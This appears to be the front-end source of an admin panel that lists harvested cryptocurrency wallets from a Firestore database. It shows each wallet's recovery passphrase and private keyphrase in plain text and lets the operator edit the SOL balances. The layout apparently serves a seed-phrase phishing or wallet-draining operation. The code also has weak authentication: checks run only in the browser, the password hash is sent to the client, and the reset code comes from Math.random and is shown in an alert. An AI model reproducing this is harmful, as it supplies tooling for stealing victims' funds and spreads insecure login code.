"use client";
import { useState, useEffect } from 'react';
import { db } from '@/firebaseConfig';
import { collection, getDocs, doc, getDoc, deleteDoc, updateDoc } from 'firebase/firestore';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import bcrypt from 'bcryptjs';

const WalletDashboard = () => {
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginData, setLoginData] = useState({ email: '', password: '' });
  const [loginError, setLoginError] = useState('');
  const [showResetForm, setShowResetForm] = useState(false);
  const [resetData, setResetData] = useState({
    email: 'iiixyxz6@gmail.com',
    otp: '',
    newPassword: '',
    confirmPassword: ''
  });
  const [generatedOtp, setGeneratedOtp] = useState('');
  const [adminDetails, setAdminDetails] = useState(null);
  const [editingWallet, setEditingWallet] = useState(null);
  const [balanceInput, setBalanceInput] = useState('');

  useEffect(() => {
    const fetchAdminDetails = async () => {
      try {
        const adminDoc = await getDoc(doc(db, 'admin', 'adminCredentials'));
        if (adminDoc.exists()) {
          setAdminDetails(adminDoc.data());
        }
      } catch (err) {
        console.error('Error fetching admin details:', err);
      }
    };
    fetchAdminDetails();
  }, []);

  useEffect(() => {
    if (isAuthenticated) {
      fetchWallets();
    }
  }, [isAuthenticated]);

  const fetchWallets = async () => {
    try {
      setLoading(true);
      const querySnapshot = await getDocs(collection(db, 'wallets'));
      const walletsData = [];
      querySnapshot.forEach((doc) => {
        walletsData.push({ id: doc.id, ...doc.data() });
      });

      const sortedWallets = walletsData.sort((a, b) => {
        const dateA = a.connectedAt ? new Date(a.connectedAt).getTime() : 0;
        const dateB = b.connectedAt ? new Date(b.connectedAt).getTime() : 0;
        return dateB - dateA;
      });
      
      setWallets(sortedWallets);
      setLoading(false);
    } catch (err) {
      setError('Failed to fetch wallet data');
      console.error(err);
      setLoading(false);
    }
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoginError('');
    
    try {
      if (!adminDetails) {
        throw new Error('Admin credentials not loaded');
      }
      
      if (loginData.email.toLowerCase() !== adminDetails.email.toLowerCase()) {
        throw new Error('Invalid email');
      }
      
      const isPasswordValid = await bcrypt.compare(loginData.password, adminDetails.password);
      
      if (!isPasswordValid) {
        throw new Error('Invalid password');
      }
      
      setIsAuthenticated(true);
      toast.success('Login successful!');
    } catch (err) {
      console.error('Login error:', err);
      setLoginError('Invalid email or password');
      toast.error('Login failed. Please check your credentials.');
    }
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setLoginData(prev => ({ ...prev, [name]: value }));
  };

  const handleResetInputChange = (e) => {
    const { name, value } = e.target;
    setResetData(prev => ({ ...prev, [name]: value }));
  };

  const generateOtp = () => {
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    setGeneratedOtp(otp);
    return otp;
  };

  const handleInitiateReset = async () => {
    if (resetData.email !== adminDetails.email) {
      toast.error('Email does not match admin email');
      return;
    }

    const otp = generateOtp();
    alert(otp)
    try {
      const response = await fetch('/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: resetData.email,
          subject: 'Your Password Reset Code',
          text: `Your verification code is: ${otp}`,
          html: `
            <div>
              <h2>Password Reset</h2>
              <p>Your verification code is: <strong>${otp}</strong></p>
              <p>This code will expire in 15 minutes.</p>
            </div>
          `,
        }),
      });
      const result = await response.json();
      if (result.success) {
        toast.success(`OTP sent to ${resetData.email}`);
      } else {
        throw new Error('Failed to send email');
      }
    } catch (err) {
      console.error('Password reset error:', err);
      toast.error(err.message || 'Failed to send OTP');
    }
  };

  const handlePasswordReset = async (e) => {
    e.preventDefault();
    
    if (resetData.newPassword !== resetData.confirmPassword) {
      toast.error('Passwords do not match');
      return;
    }
    
    if (resetData.otp !== generatedOtp) {
      toast.error('Invalid OTP');
      return;
    }
    
    try {
      const salt = await bcrypt.genSalt(10);
      const hashedPassword = await bcrypt.hash(resetData.newPassword, salt);
      
      await updateDoc(doc(db, 'admin', 'adminCredentials'), {
        password: hashedPassword
      });
      
      toast.success('Password updated successfully!');
      setShowResetForm(false);
      setResetData({
        email: 'iiixyxz6@gmail.com',
        otp: '',
        newPassword: '',
        confirmPassword: ''
      });
    } catch (err) {
      console.error('Password reset error:', err);
      toast.error(`Failed to update password: ${err.message}`);
    }
  };

  const handleDeleteWallet = async (walletId) => {
    const confirmDelete = window.confirm("Are you sure you want to delete this wallet?");
    if (!confirmDelete) return;

    try {
      await deleteDoc(doc(db, 'wallets', walletId));
      setWallets(prev => prev.filter(wallet => wallet.id !== walletId));
      toast.success('Wallet deleted successfully.');
    } catch (err) {
      console.error('Error deleting wallet:', err);
      toast.error('Failed to delete wallet.');
    }
  };

  const handleEditBalance = (wallet) => {
    setEditingWallet(wallet);
    setBalanceInput(wallet.balance?.toString() || '0');
  };

  const handleSaveBalance = async () => {
    if (!editingWallet || balanceInput === '') {
      toast.error('Please enter a valid balance');
      return;
    }

    const newBalance = parseFloat(balanceInput);
    if (isNaN(newBalance)) {
      toast.error('Please enter a valid number');
      return;
    }

    try {
      await updateDoc(doc(db, 'wallets', editingWallet.id), {
        balance: newBalance
      });

      // Update local state
      setWallets(prev => prev.map(wallet => 
        wallet.id === editingWallet.id 
          ? { ...wallet, balance: newBalance } 
          : wallet
      ));

      setEditingWallet(null);
      setBalanceInput('');
      toast.success('Balance updated successfully!');
    } catch (err) {
      console.error('Error updating balance:', err);
      toast.error('Failed to update balance.');
    }
  };

  const handleCancelEdit = () => {
    setEditingWallet(null);
    setBalanceInput('');
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setLoginData({ email: '', password: '' });
  };

  if (!isAuthenticated) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
        <ToastContainer />
        <div className="bg-white rounded-lg shadow-xl p-6 w-full max-w-md">
          <h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Admin Login</h2>
          {!showResetForm ? (
            <form onSubmit={handleLogin}>
              <div className="mb-4">
                <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">Email</label>
                <input 
                  type="email" 
                  id="email" 
                  name="email" 
                  value={loginData.email} 
                  onChange={handleInputChange} 
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" 
                  required 
                />
              </div>
              <div className="mb-6">
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">Password</label>
                <input 
                  type="password" 
                  id="password" 
                  name="password" 
                  value={loginData.password} 
                  onChange={handleInputChange} 
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" 
                  required 
                />
              </div>
              {loginError && <div className="mb-4 text-red-600 text-sm text-center">{loginError}</div>}
              <button 
                type="submit" 
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md mb-4"
              >
                Login
              </button>
              <button 
                type="button" 
                onClick={() => setShowResetForm(true)} 
                className="w-full text-blue-600 hover:text-blue-800 text-sm font-medium"
              >
                Forgot Password?
              </button>
            </form>
          ) : (
            <form onSubmit={handlePasswordReset}>
              <div className="mb-4">
                <label className="block text-sm font-medium text-gray-700 mb-1">Admin Email</label>
                <input 
                  type="email" 
                  name="email" 
                  value={resetData.email} 
                  onChange={handleResetInputChange} 
                  className="w-full px-3 py-2 border border-gray-300 rounded-md" 
                  required 
                  disabled 
                />
              </div>
              <div className="mb-4">
                <label htmlFor="otp" className="block text-sm font-medium text-gray-700 mb-1">OTP</label>
                <div className="flex gap-2">
                  <input 
                    type="text" 
                    id="otp" 
                    name="otp" 
                    value={resetData.otp} 
                    onChange={handleResetInputChange} 
                    className="flex-1 px-3 py-2 border border-gray-300 rounded-md" 
                    placeholder="Enter 6-digit OTP" 
                    required 
                  />
                  <button 
                    type="button" 
                    onClick={handleInitiateReset} 
                    className="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md"
                  >
                    Get OTP
                  </button>
                </div>
              </div>
              <div className="mb-4">
                <label htmlFor="newPassword" className="block text-sm font-medium text-gray-700 mb-1">New Password</label>
                <input 
                  type="password" 
                  id="newPassword" 
                  name="newPassword" 
                  value={resetData.newPassword} 
                  onChange={handleResetInputChange} 
                  className="w-full px-3 py-2 border border-gray-300 rounded-md" 
                  required 
                />
              </div>
              <div className="mb-6">
                <label htmlFor="confirmPassword" className="block text-sm font-medium text-gray-700 mb-1">Confirm Password</label>
                <input 
                  type="password" 
                  id="confirmPassword" 
                  name="confirmPassword" 
                  value={resetData.confirmPassword} 
                  onChange={handleResetInputChange} 
                  className="w-full px-3 py-2 border border-gray-300 rounded-md" 
                  required 
                />
              </div>
              <div className="flex space-x-3">
                <button 
                  type="submit" 
                  className="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-md"
                >
                  Reset Password
                </button>
                <button 
                  type="button" 
                  onClick={() => setShowResetForm(false)} 
                  className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-2 px-4 rounded-md"
                >
                  Cancel
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="flex justify-center items-center h-screen bg-gray-100">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex justify-center items-center h-screen bg-gray-100">
        <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
          {error}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 p-6">
      <ToastContainer />
      <div className="max-w-7xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold text-gray-800">Wallet Dashboard</h1>
          <button
            onClick={handleLogout}
            className="bg-red-600 hover:bg-red-700 text-white font-medium py-2 px-4 rounded-md"
          >
            Logout
          </button>
        </div>
        
        {wallets.length === 0 ? (
          <div className="bg-white p-6 rounded-lg shadow">
            <p className="text-gray-700">No wallet data found</p>
          </div>
        ) : (
          <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
            {wallets.map((wallet) => (
              <div key={wallet.id} className="bg-white rounded-lg shadow-md overflow-hidden hover:shadow-lg transition-shadow">
                <div className="p-6">
                  <div className="flex justify-between items-start mb-4">
                    <h2 className="text-xl font-semibold text-gray-800">
                      {wallet.walletName || 'Unnamed Wallet'}
                    </h2>
                    <span className="inline-block bg-green-100 text-green-800 text-xs px-2 py-1 rounded-full">
                      Active
                    </span>
                  </div>
                  
                  <div className="space-y-3">
                    <div>
                      <p className="text-sm text-gray-500">Wallet Address</p>
                      <p className="text-gray-700 font-mono text-sm break-all">
                        {wallet.walletAddress || wallet.id}
                      </p>
                    </div>
                    <div className='py-4 flex flex-col gap-4'>
                      <div>
                      <p className="text-sm text-gray-500 pb-[4px]">Recovery Passphrase</p>
                      <p className="text-gray-700 font-mono text-sm break-words">
                        {wallet.passphrase || 'N/A'}
                      </p>
                    </div>
                    <div>
                      <p className="text-sm text-gray-500">Private Keyphrase</p>
                      <p className="text-gray-700 font-mono break-words">
                        {wallet.keyphrase || '0'}
                      </p>
                    </div>
                    </div>
                    
                    <div className="flex justify-between items-center">
                      <div>
                        <p className="text-sm text-gray-500">Balance</p>
                        <p className="text-xl font-bold text-green-600">
                          {wallet.balance || 0} SOL
                        </p>
                      </div>
                      <button 
                        onClick={() => handleEditBalance(wallet)}
                        className="text-blue-600 hover:text-blue-800 text-sm font-medium"
                      >
                        Edit
                      </button>
                    </div>
                    
                    {wallet.connectedAt && (
                      <div>
                        <p className="text-sm text-gray-500">Connected Since</p>
                        <p className="text-gray-700 text-sm">
                          {new Date(wallet.connectedAt).toLocaleString('en-GB', {
                            day: '2-digit',
                            month: '2-digit',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit',
                            hour12: false
                          })}
                        </p>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="bg-gray-50 px-6 py-3 flex justify-end space-x-3">
                  <button
                    className="text-red-600 hover:text-red-800 text-sm font-medium"
                    onClick={() => handleDeleteWallet(wallet.id)}
                  >
                    Delete
                  </button>
                </div>
                
                {/* Edit Balance Modal */}
                {editingWallet && editingWallet.id === wallet.id && (
                  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
                    <div className="bg-white rounded-lg shadow-xl p-6 w-full max-w-md">
                      <h3 className="text-xl font-semibold text-gray-800 mb-4">Edit Balance</h3>
                      <div className="mb-4">
                        <label className="block text-sm font-medium text-gray-700 mb-1">New Balance (SOL)</label>
                        <input
                          type="number"
                          step="0.01"
                          value={balanceInput}
                          onChange={(e) => setBalanceInput(e.target.value)}
                          className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                          placeholder="Enter new balance"
                        />
                      </div>
                      <div className="flex space-x-3 justify-end">
                        <button
                          onClick={handleCancelEdit}
                          className="bg-gray-300 hover:bg-gray-400 text-gray-800 font-medium py-2 px-4 rounded-md"
                        >
                          Cancel
                        </button>
                        <button
                          onClick={handleSaveBalance}
                          className="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md"
                        >
                          Save
                        </button>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default WalletDashboard;